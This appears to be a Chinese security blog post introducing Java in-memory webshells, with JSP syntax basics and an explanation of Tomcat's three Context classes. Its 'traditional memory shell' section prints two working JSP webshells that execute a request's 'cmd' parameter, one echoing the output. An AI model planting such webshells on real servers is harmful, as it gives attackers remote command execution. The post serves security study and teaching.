---
title: Java 内存马之内存马介绍
date: 2026-10-16
---

# Java 内存马之内存马介绍

## 内存马简史

现在的各种防御措施越来越多，文件 shell 大部分都已经消失了，而内存马因其隐蔽性等优点从而越来越盛行。

其实内存马由来已久，在 17 年的[Tomcat 源代码调试笔记 - 看不见的 Shell](https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw)这篇文章中就已经初见端倪，但是一直不温不火，后来经过使用[agent技术](https://www.cnblogs.com/rebeyond/p/9686213.html)加持后，扩展了内存马的使用场景，然而还是停留在奇技淫巧上。在后来各种 HVV 之后，文件 webshell 已经逐渐消失，内存马开始被大众重视。在之前的 shiro 回显研究之后，无数安全研究人员开始对内存马进行研究，其中出现像 LandGrey 大佬构造的 Spring Controller 内存马。从此内存马逐步发展出三种类型：

1. servlet-api 型
   - Filter 型
   - Servlet 型
2. Spring 类
   - 拦截器
   - Controller 型
3. Java Instrumentation 类
   - agent 型

## JSP 基础

### 什么是 JSP

JSP（Java Server Pages），是 Java 的一种动态网页技术。在早期 Java 的开发技术中，Java 程序员如果想要向浏览器输出一些数据，就必须得手动`println`一行行的HTML代码。为了解决这一繁琐的问题，Java开发了 JSP 技术。

JSP 可以看作一个 Java Servlet，主要用于实现 Java web 应用程序的用户界面部分。网页开发者们通过结合 HTML 代码、XHTML 代码、XML元素以及嵌入 JSP 操作和命令来编写 JSP。

当第一次访问 JSP 页面时，Tomcat 服务器会将 JSP 页面翻译成一个 java 文件，并将其编译为`.class`文件。JSP 通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。

### JSP 语法

#### 脚本程序

脚本程序可以包含任意量的 Java 语句、变量、方法或表达式，只要它们在脚本语言中是有效的。脚本程序格式：

```jsp
<% 代码片段 %>
```

比如：

```jsp
<html>  
<body>  
<h2>Hello World!!!</h2>  
<% out.println("GoodBye!"); %>  
</body>  
</html>
```

#### JSP 声明

一个声明语句可以声明一个或多个变量、方法，供后面的 Java 代码使用。JSP 声明语句格式：

```jsp
<%! 声明  %>
```

等价于下面的 XML：

```xml
<jsp:declaration>   
代码片段
</jsp:declaration>
```

示例：

```jsp
<html>
<body>
<h2>Hello World!!!</h2>
<%! String s= "GoodBye!"; %>
<% out.println(s); %>
</body>
</html>
```

#### JSP 表达式

```jsp
<%= 表达式 %>
```

等价于下面的 XML：

```xml
<jsp:expression>表达式</jsp:expression>
```

示例：

```jsp
<html>
<body>
<h2>Hello World!!!</h2>
<p><% String name = "Drunkbaby"; %>username:<%=name%></p>
</body>
</html>
```

#### JSP 指令

JSP 指令用来设置于整个 JSP 页面相关的属性。三种 JSP 指令：

![1](https://drun1baby.top/2022/08/21/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-02-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/ThreeJSPCommand.png)

比如我们可以通过 page 指令用来设置 JSP 页面的编码格式：

```jsp
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
```

#### JSP 注释

格式：

```jsp
<%-- 注释内容 --%>
```

#### JSP 内置对象

JSP有九大内置对象，他们能够在客户端和服务器端交互的过程中分别完成不同的功能。其特点如下：

- 由 JSP 规范提供，不用编写者实例化
- 通过 Web 容器实现和管理
- 所有 JSP 页面均可使用
- 只有在脚本元素的表达式或代码段中才能使用

| 对 象       | 类型                                   | 说 明                                                        |
| ----------- | -------------------------------------- | ------------------------------------------------------------ |
| request     | javax.servlet.http.HttpServletRequest  | 获取用户请求信息                                             |
| response    | javax.servlet.http.HttpServletResponse | 响应客户端请求，并将处理信息返回到客户端                     |
| out         | javax.servlet.jsp.JspWriter            | 输出内容到 HTML 中                                           |
| session     | javax.servlet.http.HttpSession         | 用来保存用户信息                                             |
| application | javax.servlet.ServletContext           | 所有用户共享信息                                             |
| config      | javax.servlet.ServletConfig            | 这是一个 Servlet 配置对象，用于 Servlet 和页面的初始化参数   |
| pageContext | javax.servlet.jsp.PageContext          | JSP 的页面容器，用于访问 page、request、application 和 session 的属性 |
| page        | javax.servlet.jsp.HttpJspPage          | 类似于 Java 类的 this 关键字，表示当前 JSP 页面              |
| exception   | java.lang.Throwable                    | 该对象用于处理 JSP 文件执行时发生的错误和异常；只有在 JSP 页面的 page 指令中指定 isErrorPage 的取值 true 时，才可以在本页面使用 exception 对象。 |

## 传统内存马

我们先看看传统的 JSP 内存马：

```jsp
<%
    String cmd = request.getParameter("cmd");
    Runtime.getRuntime().exec(cmd);
%>
```

上面是最简单的一句话木马，没有回显，适合用来反弹 shell。

下面是一个带回显的 JSP 木马：

```jsp
<% if(request.getParameter("cmd")!=null){
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a=in.read(b))!=-1){
        out.print(new String(b));
    }
    out.print("</pre>");
}
 
%>
```

传统的 JSP 木马特征性强，且需要文件落地，容易被查杀，因此出现了内存马技术。Java 内存马又叫做“无文件马”，相较于传统的 JSP 木马，其最大的特点就是无文件落地，存在于内存中，隐蔽性强。

- 利用 Java Web 组件：动态添加恶意组件，如 Servlet、Filter、Listener 等。在 Spring 框架下就是 Controller、Intercepter。
- 修改字节码：利用 Java 的 Instrument 机制，动态注入 Agent，在 Java 内存中动态修改字节码，在 HTTP 请求执行路径中的类中添加恶意代码，可以实现根据请求的参数执行任意代码。

## Tomcat 中的三个 Context 的理解

### Context

Context 就是上下文，在 Java 中经常看到这个东西。

Context 相当于是事件发生的背景。在 Web 请求中，当一次 request 请求发生时，背景，也就是 Context 会记录当时的情形：当时 Web 容器中有几个 Filter，有什么 Servlet，有什么 Listener，请求的参数，请求的路径，有没有全局的参数等等。

### ServletContext

ServletContext 是 Servlet 规范中规定的 ServletContext 接口，一般 Servlet 都要实现这个接口。

大致就是规定了如果要实现一个 Web 容器，它的 Context 中要有这些东西：获取路径、获取参数、获取当前 Filter、获取当前 Servlet 等。

```java
package javax.servlet;

import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Enumeration;
import java.util.EnumSet;
import java.util.EventListener;
import java.util.Map;
import java.util.Set;
import javax.servlet.descriptor.JspConfigDescriptor;

public interface ServletContext {

    public static final String TEMPDIR = "javax.servlet.context.tempdir";

    public static final String ORDERED_LIBS =
        "javax.servlet.context.orderedLibs";


    public String getContextPath();
    public ServletContext getContext(String uripath);
    public int getMajorVersion();
    public int getMinorVersion();
    public int getEffectiveMajorVersion();
    public int getEffectiveMinorVersion();
    public String getMimeType(String file);
    public Set<String> getResourcePaths(String path);
    public URL getResource(String path) throws MalformedURLException;
    public InputStream getResourceAsStream(String path);
    public RequestDispatcher getRequestDispatcher(String path);
    public RequestDispatcher getNamedDispatcher(String name);
    @Deprecated
    public Servlet getServlet(String name) throws ServletException;
    @Deprecated
    public Enumeration<Servlet> getServlets();
    @Deprecated
    public Enumeration<String> getServletNames();
    public void log(String msg);
    @Deprecated
    public void log(Exception exception, String msg);
    public void log(String message, Throwable throwable);
    public String getRealPath(String path);
    public String getServerInfo();
    public String getInitParameter(String name);
    public Enumeration<String> getInitParameterNames();
    public boolean setInitParameter(String name, String value);
    public Object getAttribute(String name);
    public Enumeration<String> getAttributeNames();
    public void setAttribute(String name, Object object);
    public void removeAttribute(String name);
    public String getServletContextName();
    public ServletRegistration.Dynamic addServlet(
        String servletName, String className);
    public ServletRegistration.Dynamic addServlet(
        String servletName, Servlet servlet);
    public ServletRegistration.Dynamic addServlet(String servletName,
        Class <? extends Servlet> servletClass);
    public ServletRegistration.Dynamic addJspFile(
        String servletName, String jspFile);

    public <T extends Servlet> T createServlet(Class<T> clazz)
        throws ServletException;

    public ServletRegistration getServletRegistration(String servletName);

    public Map<String, ? extends ServletRegistration> getServletRegistrations();

    public FilterRegistration.Dynamic addFilter(
        String filterName, String className);

    public FilterRegistration.Dynamic addFilter(
        String filterName, Filter filter);

    public FilterRegistration.Dynamic addFilter(String filterName,
        Class <? extends Filter> filterClass);

    public <T extends Filter> T createFilter(Class<T> clazz)
        throws ServletException;

    public FilterRegistration getFilterRegistration(String filterName);

    public Map<String, ? extends FilterRegistration> getFilterRegistrations();

    public SessionCookieConfig getSessionCookieConfig();

    public void setSessionTrackingModes(Set<SessionTrackingMode> sessionTrackingModes);

    public Set<SessionTrackingMode> getDefaultSessionTrackingModes();

    public Set<SessionTrackingMode> getEffectiveSessionTrackingModes();

    public void addListener(String className);

    public <T extends EventListener> void addListener(T t);

    public void addListener(Class <? extends EventListener> listenerClass);

    public <T extends EventListener> T createListener(Class<T> clazz)
        throws ServletException;

    public JspConfigDescriptor getJspConfigDescriptor();

    public ClassLoader getClassLoader();

    public void declareRoles(String... roleNames);

    public String getVirtualServerName();

    public int getSessionTimeout();

    public void setSessionTimeout(int sessionTimeout);

    public String getRequestCharacterEncoding();

    public void setRequestCharacterEncoding(String encoding);

    public String getResponseCharacterEncoding();

    public void setResponseCharacterEncoding(String encoding);
}
```

可以看到 ServletContext 接口中定义了很多操作，能对 Servlet 中的各种资源进行访问、添加、删除等。

### ApplicationContext

在 Tomcat 中，ServletContext 规范的实现是 ApplicationContext，因为门面模式的原因，实际套了一层 ApplicationContextFacade。

其中 ApplicationContext 实现了 ServletContext 规范定义的一些方法，比如`addServlet()`、`addFilter()`等。

### StandardContext

`org.apache.catalina.core.StandardContext`是子容器`Context`的标准实现类，其中包含了对 Context 子容器中资源的各种操作。四种子容器都有其对应的标准实现：

![1](https://drun1baby.top/2022/08/21/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-02-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/StandardContext.png)

而在 ApplicationContext 类中，对资源的各种操作实际上是调用了 StandardContext 中的方法。

![1](https://drun1baby.top/2022/08/21/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-02-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/Use.png)

```java
...
	@Override
    public String getRequestCharacterEncoding() {
        return context.getRequestCharacterEncoding();
    }
...
```

### Tomcat 三个 Context 的总结

用一张图来表示各个 Context 之间的关系：

![1](https://drun1baby.top/2022/08/21/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-02-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/ThreeContext.png)

ServletContext 接口的实现类为 ApplicationContext 类和 ApplicationContextFacade 类，其中 ApplicationContextFacade 是对 ApplicationContext 类的包装。我们对 Context 容器中各种资源进行操作时，最终调用的还是 StandardContext 中的方法，因此 StandardContext 是 Tomcat 中负责与底层交互的 Context。

































